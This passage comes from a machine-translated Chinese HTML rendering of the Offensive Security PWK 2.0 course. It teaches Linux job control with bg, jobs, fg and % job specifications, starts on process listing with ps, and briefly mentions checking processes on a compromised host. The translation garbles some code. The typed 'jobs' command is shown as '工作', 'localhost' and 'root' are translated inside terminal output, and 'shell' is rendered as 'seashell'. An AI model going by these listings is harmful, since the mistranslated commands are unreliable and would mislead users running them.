<div style="position:absolute;top:76336;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并在稍后恢复执行。</font><font style="vertical-align: inherit;">这可以通过特定的帮助来实现</font></font></nobr></div>
<div style="position:absolute;top:76355;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令，</font><font style="vertical-align: inherit;">我们将很快探索的</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">70 个</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:76390;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.6.1 后台进程 (bg)</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:76428;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该模块中之前的作业已经在前台运行，这意味着终端是</font></font></nobr></div>
<div style="position:absolute;top:76447;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">被占用，在当前命令完成之前不能执行其他命令。</font><font style="vertical-align: inherit;">由于大部分</font></font></nobr></div>
<div style="position:absolute;top:76466;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的例子简短而甜蜜，这并没有引起问题。</font><font style="vertical-align: inherit;">然而，我们将</font></font></nobr></div>
<div style="position:absolute;top:76486;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在后面的模块中运行更长更复杂的命令，我们可以将这些命令发送到后台</font></font></nobr></div>
<div style="position:absolute;top:76505;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以重新获得对终端的控制并执行其他命令。</font></font></nobr></div>
<div style="position:absolute;top:76538;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使进程后台运行的最快方法是在进程末尾附加一个</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与号</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">( </font><b><font style="font-size:13px"><font style="vertical-align: inherit;">&amp;</font></font></b><font style="vertical-align: inherit;"> )</font></font></nobr></div>
<div style="position:absolute;top:76557;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令在它启动后立即将其发送到后台。</font><font style="vertical-align: inherit;">让我们尝试一个简短的例子：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:76592;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ping -c 400 localhost &gt; ping_results.txt &amp;</font></font></font></b></nobr></div>
<div style="position:absolute;top:76611;left:314"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 59 - 在作业开始后立即将其设为后台</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:76641;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在清单 59 中，我们使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ping</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">向本地接口发送了 400 个 ICMP 回显请求，</font><font style="vertical-align: inherit;">然后</font></font></nobr></div>
<div style="position:absolute;top:76660;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将结果写入名为 ping_results.txt 的文件。</font><font style="vertical-align: inherit;">执行自动运行在</font></font></nobr></div>
<div style="position:absolute;top:76680;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">后台，让 shell 空闲以进行其他操作。</font></font></nobr></div>
<div style="position:absolute;top:76712;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，如果我们忘记在末尾附加 &amp; 号会发生什么？</font></font></nobr></div>
<div style="position:absolute;top:76731;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令？</font><font style="vertical-align: inherit;">该命令将在前台运行，我们将被迫要么</font></font></nobr></div>
<div style="position:absolute;top:76751;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C c</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">取消命令</font><font style="vertical-align: inherit;">或等待命令完成以重新获得对</font></font></nobr></div>
<div style="position:absolute;top:76770;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">终端。</font><font style="vertical-align: inherit;">另一种选择是在作业</font><font style="vertical-align: inherit;">已经启动后</font><font style="vertical-align: inherit;">使用</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C z</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">暂停作业</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">一旦</font></font></nobr></div>
<div style="position:absolute;top:76790;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作业已暂停，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">bg</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">在后台恢复它</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:76824;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ping -c 400 localhost &gt; ping_results.txt</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:76842;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">^Z</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:76859;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[1]+ 停止    </font></font></nobr></div>
<div style="position:absolute;top:76859;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ping -c 400 本地主机&gt; ping_results.txt</font></font></nobr></div>
<div style="position:absolute;top:76892;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">bg</font></font></font></b></nobr></div>
<div style="position:absolute;top:76909;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[1]+ ping -c 400 本地主机 &gt; ping_results.txt</font></font></nobr></div>
<div style="position:absolute;top:76926;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font></nobr></div>
<div style="position:absolute;top:76946;left:342"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 60 - 使用 bg 后台作业</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:76975;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作业现在在后台运行，我们可以根据需要继续使用终端。</font><font style="vertical-align: inherit;">尽管</font></font></nobr></div>
<div style="position:absolute;top:76995;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这样做时，请记住，某些过程对时间敏感，如果出现以下情况可能会给出错误的结果</font></font></nobr></div>
<div style="position:absolute;top:77014;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">离开太久了。</font><font style="vertical-align: inherit;">例如，在 ping 示例中，回声回复可能会返回，但如果</font></font></nobr></div>
<div style="position:absolute;top:77033;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当数据包进来时进程被暂停，进程可能会错过它，导致不正确</font></font></nobr></div>
<div style="position:absolute;top:77053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出。</font><font style="vertical-align: inherit;">始终考虑您正在运行的命令的上下文</font></font></nobr></div>
<div style="position:absolute;top:77072;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从事工作控制。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:77106;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.6.2 作业控制：jobs 和 fg</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:77144;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了快速检查我们的 ICMP 回声请求的状态，我们需要利用两个额外的</font></font></nobr></div>
<div style="position:absolute;top:77164;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令：</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">jobs</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fg</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:77267;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">70 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Bash 参考手册，2002 年），http://www.faqs.org/docs/bashman/bashref_78.html#SEC85</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:77395;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="66"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 66 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:77428;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:78505;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:78505;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:78505;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">66</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:77524;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内置的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作业</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实用程序列出了当前终端会话中正在运行的作业，而</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fg</font></font></font></b></nobr></div>
<div style="position:absolute;top:77543;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将作业返回到前台。</font><font style="vertical-align: inherit;">这些命令显示在下面的操作中：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:77578;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ping -c 400 localhost &gt; ping_results.txt</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:77595;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">^Z</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:77612;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[1]+ 停止    </font></font></nobr></div>
<div style="position:absolute;top:77612;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ping -c 400 本地主机&gt; ping_results.txt</font></font></nobr></div>
<div style="position:absolute;top:77646;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">find / -name sbd.exe</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:77663;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">^Z</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:77680;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[2]+ 停止    </font></font></nobr></div>
<div style="position:absolute;top:77680;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">find / -name sbd.exe</font></font></nobr></div>
<div style="position:absolute;top:77714;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工作</font></font></font></b></nobr></div>
<div style="position:absolute;top:77731;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[1]- 停止    </font></font></nobr></div>
<div style="position:absolute;top:77731;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ping -c 400 本地主机&gt; ping_results.txt</font></font></nobr></div>
<div style="position:absolute;top:77748;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[2]+ 停止    </font></font></nobr></div>
<div style="position:absolute;top:77748;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">find / -name sbd.exe</font></font></nobr></div>
<div style="position:absolute;top:77782;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fg %1</font></font></font></b></nobr></div>
<div style="position:absolute;top:77799;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ping -c 400 本地主机&gt; ping_results.txt</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:77815;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">^C</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:77850;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工作</font></font></font></b></nobr></div>
<div style="position:absolute;top:77867;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[2]+ 停止    </font></font></nobr></div>
<div style="position:absolute;top:77867;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">find / -name sbd.exe</font></font></nobr></div>
<div style="position:absolute;top:77900;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fg</font></font></font></b></nobr></div>
<div style="position:absolute;top:77917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">find / -name sbd.exe</font></font></nobr></div>
<div style="position:absolute;top:77934;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/windows-resources/sbd/sbd.exe</font></font></nobr></div>
<div style="position:absolute;top:77954;left:241"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 61 - 使用作业查看作业并使用 fg 将作业置于前台</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:77984;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 61 中有几件事值得一提。</font></font></nobr></div>
<div style="position:absolute;top:78016;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，奇数</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">^C</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符表示击键组合</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C c</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">我们可以使用这个快捷方式</font></font></nobr></div>
<div style="position:absolute;top:78035;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">终止一个长时间运行的进程并重新获得对终端的控制。</font></font></nobr></div>
<div style="position:absolute;top:78068;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其次，在</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fg %1</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令中</font><font style="vertical-align: inherit;">使用“%1”</font><font style="vertical-align: inherit;">是新的。</font><font style="vertical-align: inherit;">有多种方式来指称工作</font></font></nobr></div>
<div style="position:absolute;top:78088;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">贝壳。</font><font style="vertical-align: inherit;">“%”字符后跟 JobID 表示作业规范。</font><font style="vertical-align: inherit;">JobID 可以是</font></font></nobr></div>
<div style="position:absolute;top:78107;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程 ID (PID) 号，或者您可以使用以下符号组合之一：</font></font></nobr></div>
<div style="position:absolute;top:78140;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:78140;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">%Number : 指作业编号，例如 %1 或 %2</font></font></nobr></div>
<div style="position:absolute;top:78168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:78168;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">%String : 指暂停命令名称的开头，例如</font></font></nobr></div>
<div style="position:absolute;top:78188;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">%commandNameHere 或 %ping</font></font></nobr></div>
<div style="position:absolute;top:78216;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:78216;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">%+ OR %% : 指当前作业</font></font></nobr></div>
<div style="position:absolute;top:78244;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:78244;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">%- : 指之前的工作</font></font></nobr></div>
<div style="position:absolute;top:78277;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，如果只有一个进程被后台处理，则不需要作业号。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:78311;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.6.3 进程控制：ps和kill</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:78349;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在几乎任何类 Unix 操作系统上监视进程的最有用的命令之一</font></font></nobr></div>
<div style="position:absolute;top:78369;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ps </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">71</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程状态的</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缩写</font><font style="vertical-align: inherit;">）。</font><font style="vertical-align: inherit;">与 jobs 命令不同，ps 列出系统范围内的进程，而不是</font></font></nobr></div>
<div style="position:absolute;top:78388;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仅适用于当前终端会话。</font><font style="vertical-align: inherit;">该实用程序被认为是类 Unix 操作系统及其</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:78455;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">71 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Linux 信息项目，2005 年），http://www.linfo.org/ps.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:78583;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="67"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 67 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:78616;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:79693;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:79693;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:79693;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">67</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:78712;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">name 如此广为人知，以至于即使在 Windows PowerShell 上，ps 也是一个预定义的命令别名</font></font></nobr></div>
<div style="position:absolute;top:78731;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Get-Process</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> cmdlet，它基本上用于相同的目的。</font></font></nobr></div>
<div style="position:absolute;top:78764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为渗透测试人员，在获得对系统的远程访问权限后首先要检查的事情之一</font></font></nobr></div>
<div style="position:absolute;top:78783;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是了解当前在受感染机器上运行的软件。</font><font style="vertical-align: inherit;">这可以帮助</font></font></nobr></div>
<div style="position:absolute;top:78803;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们提升我们的特权或收集其他信息，以便进一步访问</font></font></nobr></div>
<div style="position:absolute;top:78822;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络。</font></font></nobr></div>
<div style="position:absolute;top:78855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为一个例子，让我们开始Leafpad文本编辑器，然后尝试找到它的进程ID（PID）</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">72</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从</font></font></nobr></div>
<div style="position:absolute;top:78874;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ps</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令的</font><font style="vertical-align: inherit;">命令行</font><font style="vertical-align: inherit;">（清单 62）：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:78909;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ps -ef</font></font></font></b></nobr></div>
<div style="position:absolute;top:78926;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户标识    </font></font></nobr></div>
<div style="position:absolute;top:78926;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PID PPID C STIME TTY    </font></font></nobr></div>
<div style="position:absolute;top:78926;left:473"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">时间命令</font></font></nobr></div>
<div style="position:absolute;top:78943;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根    </font></font></nobr></div>
<div style="position:absolute;top:78943;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 0 0 10:18 ?    </font></font></nobr></div>
<div style="position:absolute;top:78943;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00:00:02 /sbin/init</font></font></nobr></div>
<div style="position:absolute;top:78960;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根    </font></font></nobr></div>
<div style="position:absolute;top:78960;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2 0 0 10:18 ?    </font></font></nobr></div>
<div style="position:absolute;top:78960;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00:00:00 [kthreadd]</font></font></nobr></div>
<div style="position:absolute;top:78977;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根    </font></font></nobr></div>
<div style="position:absolute;top:78977;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3 2 0 10:18 ?    </font></font></nobr></div>
<div style="position:absolute;top:78977;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00:00:00 [rcu_gp]</font></font></nobr></div>
<div style="position:absolute;top:78994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根    </font></font></nobr></div>
<div style="position:absolute;top:78994;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4 2 0 10:18 ?    </font></font></nobr></div>
<div style="position:absolute;top:78994;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00:00:00 [rcu_par_gp]</font></font></nobr></div>
<div style="position:absolute;top:79011;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根    </font></font></nobr></div>
<div style="position:absolute;top:79011;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5 2 0 10:18 ?    </font></font></nobr></div>
<div style="position:absolute;top:79011;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00:00:00 [kworker/0:0-事件]</font></font></nobr></div>
<div style="position:absolute;top:79028;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根    </font></font></nobr></div>
<div style="position:absolute;top:79028;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6 2 0 10:18 ?    </font></font></nobr></div>
<div style="position:absolute;top:79028;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00:00:00 [kworker/0:0H-kblockd]</font></font></nobr></div>
<div style="position:absolute;top:79045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根    </font></font></nobr></div>
<div style="position:absolute;top:79045;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7 2 0 10:18 ?    </font></font></nobr></div>
<div style="position:absolute;top:79045;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00:00:00 [kworker/u256:0-events_unbound</font></font></nobr></div>
<div style="position:absolute;top:79062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根    </font></font></nobr></div>
<div style="position:absolute;top:79062;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8 2 0 10:18 ?    </font></font></nobr></div>
<div style="position:absolute;top:79062;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00:00:00 [mm_percpu_wq]</font></font></nobr></div>
<div style="position:absolute;top:79079;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根    </font></font></nobr></div>
<div style="position:absolute;top:79079;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9 2 0 10:18 ?    </font></font></nobr></div>
<div style="position:absolute;top:79079;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00:00:00 [ksoftirqd/0]</font></font></nobr></div>
<div style="position:absolute;top:79096;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根    </font></font></nobr></div>
